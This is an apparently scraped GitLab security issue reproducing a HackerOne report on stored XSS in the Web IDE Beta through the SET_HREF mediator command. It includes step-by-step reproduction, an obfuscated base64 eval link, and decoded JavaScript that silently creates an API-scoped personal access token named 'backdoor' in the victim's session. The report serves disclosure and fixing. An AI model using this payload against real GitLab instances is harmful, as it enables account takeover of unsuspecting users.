12 days&#39; time and so enabling this feature flag will soon no longer be required).\n\n3. Create a new project from [https://gitlab/projects/new#blank_project](https://gitlab/projects/new#blank_project) and commit a README.md file containing the following proof of concept link, whose decoded JavaScript is included at the end of this section under \&quot;PoC Code\&quot;:\n\n    ```markdown  \n    [Execute command](command:gitlab-web-ide.mediator.set-href?[\&quot;javascript:eval%28atob%28&#39;dmFyIHRvayxwPW5ldyBET01QYXJzZXIsbz13aW5kb3cubG9jYXRpb24ub3JpZ2luO2ZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiBlLm9rP2UudGV4dCgpOlByb21pc2UucmVqZWN0KGUpfSkpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiB0b2s9cC5wYXJzZUZyb21TdHJpbmcoZSwidGV4dC9odG1sIikuZ2V0RWxlbWVudHNCeU5hbWUoImNzcmYtdG9rZW4iKVswXS5jb250ZW50LGZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIse2NyZWRlbnRpYWxzOiJpbmNsdWRlIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIixtZXRob2Q6IlBPU1QifSxib2R5OmBhdXRoZW50aWNpdHlfdG9rZW49JHtlbmNvZGVVUklDb21wb25lbnQodG9rKX0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW25hbWVdPWJhY2tkb29yJnBlcnNvbmFsX2FjY2Vzc190b2tlbltleHBpcmVzX2F0XT0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW3Njb3Blc11bXT1hcGlgLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyJ9KX0pKS50aGVuKChmdW5jdGlvbihlKXtyZXR1cm4gZS5vaz9lLmpzb24oKTpQcm9taXNlLnJlamVjdChlKX0pKS50aGVuKChmdW5jdGlvbihlKXthbGVydChgQ3JlYXRlZCBwZXJzb25hbCBhY2Nlc3MgdG9rZW46ICR7ZS5uZXdfdG9rZW59YCl9KSk7&#39;%29%29\&quot;])  \n    ```\n\n4. Open the README.md file in the Web IDE (https://gitlab/-/ide/project/demo/edit/main/-/README.md) and Ctrl/Cmd-click on the \&quot;Execute command\&quot; link.\n\n5. Observe the JavaScript alert dialog containing a newly minted personal access token for the logged-in user.\n\n#####  PoC Code\n\n```javascript  \nvar tok,p=new DOMParser,o=window.location.origin;fetch(o+\&quot;/-/profile/personal_access_tokens\&quot;).then((function(e){return e.ok?e.text():Promise.reject(e)})).then((function(e){return tok=p.parseFromString(e,\&quot;text/html\&quot;).getElementsByName(\&quot;csrf-token\&quot;)[0].content,fetch(o+\&quot;/-/profile/personal_access_tokens\&quot;,{credentials:\&quot;include\&quot;,headers:{\&quot;Content-Type\&quot;:\&quot;application/x-www-form-urlencoded\&quot;,method:\&quot;POST\&quot;},body:`authenticity_token=${encodeURIComponent(tok)}\u0026personal_access_token[name]=backdoor\u0026personal_access_token[expires_at]=\u0026personal_access_token[scopes][]=api`,method:\&quot;POST\&quot;,mode:\&quot;cors\&quot;})})).then((function(e){return e.ok?e.json():Promise.reject(e)})).then((function(e){alert(`Created personal access token: ${e.new_token}`)}));  \n```\n\n####  Impact\n\nAn attacker who convinces a victim to interact with a Markdown link in the new Web IDE can execute JavaScript in that victim&#39;s GitLab session allowing them to perform unwanted actions on their behalf and take over their account.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [GitLab_WebIDE_XSS.png](https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png)\n* [GitLab_WebIDE_Mediator.png](https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;initialTaskCompletionStatus&quot;:{&quot;count&quot;:0,&quot;completed_count&quot;:0},&quot;canCreateIncident&quot;:false,&quot;fullPath&quot;:&quot;gitlab-org/gitlab&quot;,&quot;iid&quot;:407783,&quot;issuableId&quot;:126893846,&quot;issueType&quot;:&quot;issue&quot;,&quot;isHidden&quot;:false,&quot;zoomMeetingUrl&quot;:null,&quot;authorId&quot;:2741139,&quot;authorName&quot;:&quot;GitLab SecurityBot&quot;,&quot;authorUsername&quot;:&quot;gitlab-securitybot&quot;,&quot;authorWebUrl&quot;:&quot;/gitlab-securitybot&quot;,&quot;createdAt&quot;:&quot;2023-04-18T17:13:51+00:00&quot;,&quot;isFirstContribution&quot;:false,&quot;serviceDeskReplyTo&quot;:null,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;signInPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;publishedIncidentUrl&quot;:null,&quot;slaFeatureAvailable&quot;:&quot;false&quot;,&quot;uploadMetricsFeatureAvailable&quot;:&quot;false&quot;,&quot;projectId&quot;:278964,&quot;projectPath&quot;:&quot;gitlab&quot;,&quot;projectNamespace&quot;:&quot;gitlab-org&quot;,&quot;canAdmin&quot;:false,&quot;hasIssueWeightsFeature&quot;:true,&quot;hasIterationsFeature&quot;:true,&quot;canAdminRelation&quot;:false}" id="js-issuable-app">
<div class="title-container">
<h1 class="gl-heading-1 !gl-m-0">Stored XSS in Web IDE Beta via crafted URL executing SET_HREF mediator command with user-controlled href attribute</h1>
</div>
<div class="description">
<div class="md"><p data-sourcepos="1:1-1:247" dir="auto"><gl-emoji title="warning sign" data-name="warning" data-unicode-version="4.0">⚠</gl-emoji> <strong data-sourcepos="1:11-1:247">Please read <a data-sourcepos="1:25-1:125" href="https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md">the process</a> on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.</strong></p>&#x000A;<p data-sourcepos="3:1-3:125" dir="auto"><strong data-sourcepos="3:1-3:70"><a data-sourcepos="3:3-3:68" href="https://hackerone.com/reports/1940598" rel="nofollow noreferrer noopener" target="_blank">HackerOne report #1940598</a></strong> by <code data-sourcepos="3:76-3:90">viridian_40826d</code> on 2023-04-10, assigned to <a href="/greg" data-reference-type="user" data-user="3645992" data-container="body" data-placement="top" class="gfm gfm-project_member js-user-link" title="Greg Myers">@greg</a>:</p>&#x000A;<p data-sourcepos="5:1-5:87" dir="auto"><a data-sourcepos="5:1-5:17" href="#report">Report</a> | <a data-sourcepos="5:21-5:47" href="#attachments">Attachments</a> | <a data-sourcepos="5:51-5:87" href="#how-to-reproduce">How To Reproduce</a></p>&#x000A;<h2 data-sourcepos="7:1-7:9" dir="auto">&#x000A;<a id="user-content-report" class="anchor" href="#report" aria-hidden="true"></a>Report</h2>&#x000A;<h4 data-sourcepos="9:1-9:13" dir="auto">&#x000A;<a id="user-content-summary" class="anchor" href="#summary" aria-hidden="true"></a>Summary</h4>&#x000A;<p data-sourcepos="11:1-11:250" dir="auto">Since <a href="https://gitlab.com/gitlab-org/gitlab/-/merge_requests/95169" data-reference-type="merge_request" data-original="v15.7" data-link="true" data-link-reference="true" data-project="278964" data-merge-request="170822769" data-project-path="gitlab-org/gitlab" data-iid="95169" data-container="body" data-placement="top" title="Part 1 - Add @gitlab/web-ide use behind feature flag" class="gfm gfm-merge_request">v15.7</a>, GitLab ships with a new <a data-sourcepos="11:101-11:174" href="https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html" rel="nofollow noreferrer noopener" target="_blank">Web IDE</a> powered by the <a data-sourcepos="11:191-11:242" href="https://github.com/microsoft/monaco-editor" rel="nofollow noreferrer noopener" target="_blank">Monaco</a> editor.</p>&#x000A;<p data-sourcepos="13:1-13:325" dir="auto">The Web IDE is <a data-sourcepos="13:16-13:156" href="https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/77e6cd26c9f6b2694290b9800f9cc0c2b328e1bd/docs/dev/architecture_packages.md">architected</a> such that certain interactions take place outside of the sandboxed Monaco runtime environment. These interactions are handled by the <code data-sourcepos="13:292-13:315">vscode-mediator-commands</code> package:</p>&#x000A;<blockquote data-sourcepos="15:1-15:319" dir="auto">&#x000A;<p data-sourcepos="15:3-15:319">The vscode-mediator-commands package creates a set of commands that can be <strong data-sourcepos="15:78-15:90">triggered</strong> from the VSCode Extension runtime environment but are <strong data-sourcepos="15:146-15:157">executed</strong> in the Iframe runtime environment. This means that web requests naturally use the Main cookie and the command can have full access to the provided configuration.</p>&#x000A;</blockquote>&#x000A;<p data-sourcepos="17:1-17:325" dir="auto">One such mediator command is <code data-sourcepos="17:31-17:38">SET_HREF</code>, which <a data-sourcepos="17:48-17:218" href="https://gitlab.com/gitlab-org/gitlab-web-ide/-/blob/42428717ac4793969ad83c8feaa67440b36b1a96/packages/vscode-mediator-commands/src/commands/index.ts#L115-120">constructs</a> a URL object by concatenating the value of <code data-sourcepos="17:264-17:290">window.parent.location.href</code> with the <code data-sourcepos="17:303-17:306">href</code> string attribute:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="19:1-23:3" data-canonical-lang="javascript" class="code highlight js-syntax-highlight language-javascript" lang="javascript" v-pre="true"><code><span id="LC1" class="line" lang="javascript"><span class="kd">const</span> <span class="nx">parentHref</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>  </span>&#x000A;<span id="LC2" class="line" lang="javascript"><span class="kd">const</span> <span class="nx">newUrl</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">href</span><span class="p">,</span> <span class="nx">parentHref</span><span class="p">);</span>  </span>&#x000A;<span id="LC3" class="line" lang="javascript"><span class="nb">window</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">newUrl</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="25:1-25:188" dir="auto">By default, the UI calls the <code data-sourcepos="25:31-25:38">SET_HREF</code> command referencing an enum of trusted links to the preferences and feedback pages so that these can be opened in a new tab, outside of the sandbox:</p>&#x000A;<p data-sourcepos="27:1-27:122" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/0a54e2580def552ecd8c8f0c1c58b2cbfdd9105f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62303930623666352d636134652d343130312d383030392d6366396630623963663135632f4769744c61625f5765624944455f4d65646961746f722e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png"><img data-sourcepos="27:1-27:122" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="GitLab_WebIDE_Mediator.png" data-canonical-src="https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/0a54e2580def552ecd8c8f0c1c58b2cbfdd9105f/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62303930623666352d636134652d343130312d383030392d6366396630623963663135632f4769744c61625f5765624944455f4d65646961746f722e706e67"></a></p>&#x000A;<p data-sourcepos="29:1-29:226" dir="auto">However,  the <code data-sourcepos="29:16-29:19">href</code> attribute can become user-controlled when a mediator command URL is formed in Markdown. We can then clobber the <code data-sourcepos="29:135-29:144">parentHref</code> by introducing our own URL in <code data-sourcepos="29:178-29:181">href</code> with an explicitly defined scheme, like so:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="31:1-34:3" data-canonical-lang="markdown" class="code highlight js-syntax-highlight language-markdown" lang="markdown" v-pre="true"><code><span id="LC1" class="line" lang="markdown"><span class="c">&lt;!-- Opens the result of: new URL("javascript:confirm(document.domain)", "https://gitlab") --&gt;</span>  </span>&#x000A;<span id="LC2" class="line" lang="markdown"><span class="p">[</span><span class="nv">Execute command</span><span class="p">](</span><span class="sx">command:gitlab-web-ide.mediator.set-href?["javascript:confirm%28document.domain%29"]</span><span class="p">)</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<p data-sourcepos="36:1-36:326" dir="auto">While the subframe used to <em data-sourcepos="36:28-36:36">preview</em> Markdown is itself sandboxed, the editor frame and its interactions with the mediator are not. Since the Web IDE supports Monaco's "follow link" behaviour, an attacker can execute arbitrary JavaScript in a victim's GitLab session when they Ctrl/Cmd-click a crafted link in a Markdown file:</p>&#x000A;<p data-sourcepos="38:1-38:112" dir="auto"><a class="no-attachment-icon" href="https://user-content.gitlab-static.net/6b3cd599c17c9bf5606b433a3d11258b639d6e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626236323330652d346439622d343533302d386537612d3663393563303763636634612f4769744c61625f5765624944455f5853532e706e67" target="_blank" rel="nofollow noreferrer noopener" data-canonical-src="https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png"><img data-sourcepos="38:1-38:112" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="GitLab_WebIDE_XSS.png" data-canonical-src="https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png" decoding="async" class="lazy" data-src="https://user-content.gitlab-static.net/6b3cd599c17c9bf5606b433a3d11258b639d6e88/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f64626236323330652d346439622d343533302d386537612d3663393563303763636634612f4769744c61625f5765624944455f5853532e706e67"></a></p>&#x000A;<h4 data-sourcepos="40:1-40:17" dir="auto">&#x000A;<a id="user-content-environment" class="anchor" href="#environment" aria-hidden="true"></a>Environment</h4>&#x000A;<p data-sourcepos="42:1-42:110" dir="auto">Self-managed GitLab CE and EE instances where a strict CSP is not enforced are affected by this vulnerability.</p>&#x000A;<p data-sourcepos="44:1-44:37" dir="auto"><code data-sourcepos="44:2-44:28">gitlab-rake gitlab:env:info</code> output:</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="46:1-76:3" data-canonical-lang="bash" class="code highlight js-syntax-highlight language-shell" lang="shell" v-pre="true"><code><span id="LC1" class="line" lang="shell">System information  </span>&#x000A;<span id="LC2" class="line" lang="shell">System:     Ubuntu 20.04  </span>&#x000A;<span id="LC3" class="line" lang="shell">Proxy:      no  </span>&#x000A;<span id="LC4" class="line" lang="shell">Current User:   git  </span>&#x000A;<span id="LC5" class="line" lang="shell">Using RVM:  no  </span>&#x000A;<span id="LC6" class="line" lang="shell">Ruby Version:   3.0.5p211  </span>&#x000A;<span id="LC7" class="line" lang="shell">Gem Version:    3.2.33  </span>&#x000A;<span id="LC8" class="line" lang="shell">Bundler Version:2.3.15  </span>&#x000A;<span id="LC9" class="line" lang="shell">Rake Version:   13.0.6  </span>&#x000A;<span id="LC10" class="line" lang="shell">Redis Version:  6.2.11  </span>&#x000A;<span id="LC11" class="line" lang="shell">Sidekiq Version:6.5.7</span>&#x000A;<span id="LC12" class="line" lang="shell"></span>&#x000A;<span id="LC13" class="line" lang="shell">GitLab information  </span>&#x000A;<span id="LC14" class="line" lang="shell">Version:    15.10.2-ee  </span>&#x000A;<span id="LC15" class="line" lang="shell">Revision:   a54d6973eae  </span>&#x000A;<span id="LC16" class="line" lang="shell">Directory:  /opt/gitlab/embedded/service/gitlab-rails  </span>&#x000A;<span id="LC17" class="line" lang="shell">DB Adapter: PostgreSQL  </span>&#x000A;<span id="LC18" class="line" lang="shell">DB Version: 13.8  </span>&#x000A;<span id="LC19" class="line" lang="shell">Elasticsearch:  no  </span>&#x000A;<span id="LC20" class="line" lang="shell">Geo:        no  </span>&#x000A;<span id="LC21" class="line" lang="shell">Using LDAP: no  </span>&#x000A;<span id="LC22" class="line" lang="shell">Using Omniauth: <span class="nb">yes  </span></span>&#x000A;<span id="LC23" class="line" lang="shell">Omniauth Providers:</span>&#x000A;<span id="LC24" class="line" lang="shell"></span>&#x000A;<span id="LC25" class="line" lang="shell">GitLab Shell  </span>&#x000A;<span id="LC26" class="line" lang="shell">Version:    14.18.0  </span>&#x000A;<span id="LC27" class="line" lang="shell">Repository storages:  </span>&#x000A;<span id="LC28" class="line" lang="shell">- default:  unix:/var/opt/gitlab/gitaly/gitaly.socket  </span>&#x000A;<span id="LC29" class="line" lang="shell">GitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="78:1-78:24" dir="auto">&#x000A;<a id="user-content-steps-to-reproduce" class="anchor" href="#steps-to-reproduce" aria-hidden="true"></a>Steps to Reproduce</h4>&#x000A;<ol data-sourcepos="80:1-93:0" dir="auto">&#x000A;<li data-sourcepos="80:1-81:0">&#x000A;<p data-sourcepos="80:4-80:147">Bring up an instance of GitLab EE (herein <code data-sourcepos="80:47-80:60">https://gitlab</code>) following the <a data-sourcepos="80:78-80:146" href="https://about.gitlab.com/install/#ubuntu" rel="nofollow noreferrer noopener" target="_blank">installation instructions</a>.</p>&#x000A;</li>&#x000A;<li data-sourcepos="82:1-83:0">&#x000A;<p data-sourcepos="82:4-82:475">Enable the <code data-sourcepos="82:16-82:29">vscode_web_ide</code> <a data-sourcepos="82:32-82:107" href="https://docs.gitlab.com/ee/administration/feature_flags.html" rel="nofollow noreferrer noopener" target="_blank">feature flag</a> by running <code data-sourcepos="82:121-82:140">gitlab-rails console</code> followed by <code data-sourcepos="82:156-82:186">Feature.enable(:vscode_web_ide)</code> once inside the IRB shell. (<strong data-sourcepos="82:217-82:231">Please note</strong>: per the <a data-sourcepos="82:242-82:321" href="https://docs.gitlab.com/ee/user/project/web_ide_beta/index.html" rel="nofollow noreferrer noopener" target="_blank">documentation</a>, the new Web IDE will be enabled by default in v15.11 which releases in 12 days' time and so enabling this feature flag will soon no longer be required).</p>&#x000A;</li>&#x000A;<li data-sourcepos="84:1-89:0">&#x000A;<p data-sourcepos="84:4-84:273">Create a new project from <a data-sourcepos="84:30-84:115" href="https://gitlab/projects/new#blank_project" rel="nofollow noreferrer noopener" target="_blank">https://gitlab/projects/new#blank_project</a> and commit a README.md file containing the following proof of concept link, whose decoded JavaScript is included at the end of this section under "PoC Code":</p>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="86:5-88:7" data-canonical-lang="markdown" class="code highlight js-syntax-highlight language-markdown" lang="markdown" v-pre="true"><code><span id="LC1" class="line" lang="markdown"><span class="p">[</span><span class="nv">Execute command</span><span class="p">](</span><span class="sx">command:gitlab-web-ide.mediator.set-href?["javascript:eval%28atob%28'dmFyIHRvayxwPW5ldyBET01QYXJzZXIsbz13aW5kb3cubG9jYXRpb24ub3JpZ2luO2ZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiBlLm9rP2UudGV4dCgpOlByb21pc2UucmVqZWN0KGUpfSkpLnRoZW4oKGZ1bmN0aW9uKGUpe3JldHVybiB0b2s9cC5wYXJzZUZyb21TdHJpbmcoZSwidGV4dC9odG1sIikuZ2V0RWxlbWVudHNCeU5hbWUoImNzcmYtdG9rZW4iKVswXS5jb250ZW50LGZldGNoKG8rIi8tL3Byb2ZpbGUvcGVyc29uYWxfYWNjZXNzX3Rva2VucyIse2NyZWRlbnRpYWxzOiJpbmNsdWRlIixoZWFkZXJzOnsiQ29udGVudC1UeXBlIjoiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIixtZXRob2Q6IlBPU1QifSxib2R5OmBhdXRoZW50aWNpdHlfdG9rZW49JHtlbmNvZGVVUklDb21wb25lbnQodG9rKX0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW25hbWVdPWJhY2tkb29yJnBlcnNvbmFsX2FjY2Vzc190b2tlbltleHBpcmVzX2F0XT0mcGVyc29uYWxfYWNjZXNzX3Rva2VuW3Njb3Blc11bXT1hcGlgLG1ldGhvZDoiUE9TVCIsbW9kZToiY29ycyJ9KX0pKS50aGVuKChmdW5jdGlvbihlKXtyZXR1cm4gZS5vaz9lLmpzb24oKTpQcm9taXNlLnJlamVjdChlKX0pKS50aGVuKChmdW5jdGlvbihlKXthbGVydChgQ3JlYXRlZCBwZXJzb25hbCBhY2Nlc3MgdG9rZW46ICR7ZS5uZXdfdG9rZW59YCl9KSk7'%29%29"]</span><span class="p">)</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;</li>&#x000A;<li data-sourcepos="90:1-91:0">&#x000A;<p data-sourcepos="90:4-90:149">Open the README.md file in the Web IDE (<a href="https://gitlab/-/ide/project/demo/edit/main/-/README.md" rel="nofollow noreferrer noopener" target="_blank">https://gitlab/-/ide/project/demo/edit/main/-/README.md</a>) and Ctrl/Cmd-click on the "Execute command" link.</p>&#x000A;</li>&#x000A;<li data-sourcepos="92:1-93:0">&#x000A;<p data-sourcepos="92:4-92:110">Observe the JavaScript alert dialog containing a newly minted personal access token for the logged-in user.</p>&#x000A;</li>&#x000A;</ol>&#x000A;<h5 data-sourcepos="94:1-94:15" dir="auto">&#x000A;<a id="user-content-poc-code" class="anchor" href="#poc-code" aria-hidden="true"></a>PoC Code</h5>&#x000A;<div class="gl-relative markdown-code-block js-markdown-code">&#x000A;<pre data-sourcepos="96:1-98:3" data-canonical-lang="javascript" class="code highlight js-syntax-highlight language-javascript" lang="javascript" v-pre="true"><code><span id="LC1" class="line" lang="javascript"><span class="kd">var</span> <span class="nx">tok</span><span class="p">,</span><span class="nx">p</span><span class="o">=</span><span class="k">new</span> <span class="nx">DOMParser</span><span class="p">,</span><span class="nx">o</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span><span class="nf">fetch</span><span class="p">(</span><span class="nx">o</span><span class="o">+</span><span class="dl">"</span><span class="s2">/-/profile/personal_access_tokens</span><span class="dl">"</span><span class="p">).</span><span class="nf">then</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ok</span><span class="p">?</span><span class="nx">e</span><span class="p">.</span><span class="nf">text</span><span class="p">():</span><span class="nb">Promise</span><span class="p">.</span><span class="nf">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">)})).</span><span class="nf">then</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">tok</span><span class="o">=</span><span class="nx">p</span><span class="p">.</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span><span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">).</span><span class="nf">getElementsByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">csrf-token</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">content</span><span class="p">,</span><span class="nf">fetch</span><span class="p">(</span><span class="nx">o</span><span class="o">+</span><span class="dl">"</span><span class="s2">/-/profile/personal_access_tokens</span><span class="dl">"</span><span class="p">,{</span><span class="na">credentials</span><span class="p">:</span><span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span><span class="na">headers</span><span class="p">:{</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">,</span><span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">},</span><span class="na">body</span><span class="p">:</span><span class="s2">`authenticity_token=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">tok</span><span class="p">)}</span><span class="s2">&amp;personal_access_token[name]=backdoor&amp;personal_access_token[expires_at]=&amp;personal_access_token[scopes][]=api`</span><span class="p">,</span><span class="na">method</span><span class="p">:</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="na">mode</span><span class="p">:</span><span class="dl">"</span><span class="s2">cors</span><span class="dl">"</span><span class="p">})})).</span><span class="nf">then</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="k">return</span> <span class="nx">e</span><span class="p">.</span><span class="nx">ok</span><span class="p">?</span><span class="nx">e</span><span class="p">.</span><span class="nf">json</span><span class="p">():</span><span class="nb">Promise</span><span class="p">.</span><span class="nf">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">)})).</span><span class="nf">then</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="nf">alert</span><span class="p">(</span><span class="s2">`Created personal access token: </span><span class="p">${</span><span class="nx">e</span><span class="p">.</span><span class="nx">new_token</span><span class="p">}</span><span class="s2">`</span><span class="p">)}));</span>  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="100:1-100:12" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="102:1-102:228" dir="auto">An attacker who convinces a victim to interact with a Markdown link in the new Web IDE can execute JavaScript in that victim's GitLab session allowing them to perform unwanted actions on their behalf and take over their account.</p>&#x000A;<h2 data-sourcepos="104:1-104:14" dir="auto">&#x000A;<a id="user-content-attachments" class="anchor" href="#attachments" aria-hidden="true"></a>Attachments</h2>&#x000A;<p data-sourcepos="106:1-106:77" dir="auto"><strong data-sourcepos="106:1-106:12">Warning:</strong> Attachments received through HackerOne, please exercise caution!</p>&#x000A;<ul data-sourcepos="108:1-110:0" dir="auto">&#x000A;<li data-sourcepos="108:1-108:113"><a data-sourcepos="108:3-108:113" href="https://h1.sec.gitlab.net/a/dbb6230e-4d9b-4530-8e7a-6c95c07ccf4a/GitLab_WebIDE_XSS.png" rel="nofollow noreferrer noopener" target="_blank">GitLab_WebIDE_XSS.png</a></li>&#x000A;<li data-sourcepos="109:1-110:0"><a data-sourcepos="109:3-109:123" href="https://h1.sec.gitlab.net/a/b090b6f5-ca4e-4101-8009-cf9f0b9cf15c/GitLab_WebIDE_Mediator.png" rel="nofollow noreferrer noopener" target="_blank">GitLab_WebIDE_Mediator.png</a></li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="111:1-111:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="113:1-113:57" dir="auto">Please add <a data-sourcepos="113:12-113:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="115:1-118:0" dir="auto">&#x000A;<li data-sourcepos="115:1-115:2">&#x000A;</li>&#x000A;<li data-sourcepos="116:1-116:2">&#x000A;</li>&#x000A;<li data-sourcepos="117:1-117:2">&#x000A;</li>&#x000A;</ol></div>
</div>

</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/278964/issues/407783/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="407783" data-issue-path="/gitlab-org/gitlab/-/issues/407783" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab" data-issuable-id="126893846" data-issuable-iid="407783" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" 